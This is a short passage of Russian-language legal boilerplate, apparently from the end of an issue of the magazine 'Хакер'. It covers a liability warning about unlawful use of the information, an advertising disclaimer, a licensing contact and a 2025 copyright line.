использующие данную информацию в противозаконных целях, могут быть привлечены к ответственности. Редакция не несет ответственности
за содержание рекламных объявлений в номере. По вопросам лицензирования и получения прав на использование редакционных материалов
журнала обращайтесь по адресу: content@glc.ru. © Журнал «Хакер», РФ, 2025